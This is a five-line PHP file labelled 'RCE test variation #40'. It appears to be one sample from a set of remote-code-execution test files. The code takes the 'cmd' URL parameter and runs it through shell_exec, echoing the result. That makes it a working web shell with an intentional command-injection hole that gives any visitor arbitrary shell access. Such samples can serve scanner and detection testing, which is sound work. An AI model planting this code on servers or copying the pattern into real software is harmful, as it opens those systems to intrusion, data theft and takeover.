<?php
// RCE test variation #40
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>